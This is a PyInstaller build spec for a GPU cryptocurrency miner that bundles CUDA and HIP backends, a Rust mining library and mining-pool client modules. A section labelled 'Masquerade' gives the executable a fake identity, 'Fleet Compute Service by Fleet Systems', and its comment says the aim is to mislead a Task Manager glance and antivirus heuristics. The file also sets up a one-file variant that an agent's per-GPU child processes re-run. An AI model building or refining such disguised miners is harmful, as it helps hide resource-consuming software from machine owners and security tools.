# PyInstaller spec for the TORCH-FREE miner (target <100 MB).
#
# Bundles: miner_capi + cuda_capi + pearl_host + pool_common, the torch-free
# p40cuda.dll, cudart64, pearl_mining (Rust), numpy, blake3. NO torch.
#
# Build (from p40-pearl-gemm/), after building p40cuda.dll:
#   pyinstaller packaging/p40-miner-lite.spec --noconfirm --distpath dist --workpath build_pyi
#
# The CUDA extension is platform-specific, so build the Linux binary on Linux.

import glob
import os

from PyInstaller.utils.hooks import collect_all

ROOT = os.path.abspath(os.getcwd())
PYDIR = os.path.join(ROOT, "python")

datas, binaries, hiddenimports = [], [], []
for pkg in ("pearl_mining", "numpy", "blake3"):
    d, b, h = collect_all(pkg)
    datas += d
    binaries += b
    hiddenimports += h

# Torch-free backend libraries + their runtimes. A universal bundle ships BOTH
# the CUDA (p40cuda_nv) and the HIP (p40cuda_amd + amdhip64) backends; rigs
# auto-pick theirs at startup. Single-backend builds keep the plain names.
for dll in (glob.glob(os.path.join(ROOT, "p40cuda.dll"))
            + glob.glob(os.path.join(ROOT, "p40cuda_nv.dll"))
            + glob.glob(os.path.join(ROOT, "p40cuda_amd.dll"))
            + glob.glob(os.path.join(ROOT, "amdhip64.dll"))
            + glob.glob(os.path.join(ROOT, "libp40cuda.so"))
            + glob.glob(os.path.join(ROOT, "libp40cuda_nv.so"))
            + glob.glob(os.path.join(ROOT, "libp40cuda_amd.so"))
            + glob.glob(os.path.join(ROOT, "libamdhip64.so"))):
    binaries += [(dll, ".")]
for cuda_env in ("CUDA_PATH", "CUDA_PATH_V12_8", "CUDA_PATH_V12_4"):
    cp = os.environ.get(cuda_env)
    if cp:
        for rt in glob.glob(os.path.join(cp, "bin", "cudart64_*.dll")):
            binaries += [(rt, ".")]
        break

hiddenimports += ["miner_capi", "cuda_capi", "pearl_host", "pool_common", "_dev",
                  "gateway_client", "kryptex_pool"]

a = Analysis(
    [os.path.join(ROOT, "packaging", "p40_miner_lite_main.py")],
    pathex=[PYDIR, ROOT],
    binaries=binaries,
    datas=datas,
    hiddenimports=hiddenimports,
    excludes=["torch", "tkinter", "matplotlib", "PIL", "pytest", "IPython", "scipy", "cupy"],
    noarchive=False,
)
pyz = PYZ(a.pure)
# Masquerade: when packaging/version_info.txt exists, the exe carries a boring
# identity (Fleet Compute Service by Fleet Systems) -- what a Task Manager
# glance and AV heuristics see. Generated by build_fleet_universal.ps1.
_vinfo = os.path.join(ROOT, "packaging", "version_info.txt")
_version = _vinfo if os.path.exists(_vinfo) else None
exe = EXE(pyz, a.scripts, [], exclude_binaries=True, name="p40-miner",
          console=True, version=_version)
coll = COLLECT(exe, a.binaries, a.datas, strip=False, upx=False, name="p40-miner")

# ONE-FILE variant (same analysis): a single self-extracting .exe. The agent's
# per-GPU children re-execute it, so each extraction happens once per process
# start (not per heartbeat). Selected with build_fleet_universal.ps1 -OneFile.
onefile = EXE(pyz, a.scripts, a.binaries, a.datas, [],
              name="p40-miner-onefile", console=True, version=_version,
              strip=False, upx=False, bootloader_ignore_signals=False)
